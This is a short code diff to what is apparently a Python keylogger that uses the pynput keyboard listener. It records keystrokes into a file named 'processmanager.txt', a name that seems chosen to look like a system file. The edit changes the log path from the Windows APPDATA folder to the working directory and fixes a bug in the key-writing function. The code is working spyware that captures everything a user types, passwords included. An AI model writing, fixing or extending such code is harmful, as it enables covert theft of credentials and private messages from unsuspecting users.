@@ -3,7 +3,7 @@ from pynput.keyboard import Listener
 
 keys = []
 count = 0
-path = os.environ['appdata'] + '\\processmanager.txt' ## for windows systems ## for linux machine you dont need //root --> path = '/root/processmanager.txt' ## if you want to running in linux
+#path = os.environ['appdata'] + '\\processmanager.txt' ## for windows systems ## for linux machine you dont need //root --> path = '/root/processmanager.txt' ## if you want to running in linux
 path = 'processmanager.txt' ## if you want to running in linux
 
 def on_press(key):
@@ -31,7 +31,7 @@ def write_file(keys):
                 f.write(' ')
             elif k.find('caps_lock') > 0:
                 f.write(' CapsLock ')
-            elif k.finder('Key'):
+            elif k.find('Key'):
                 f.write(k)
 
 
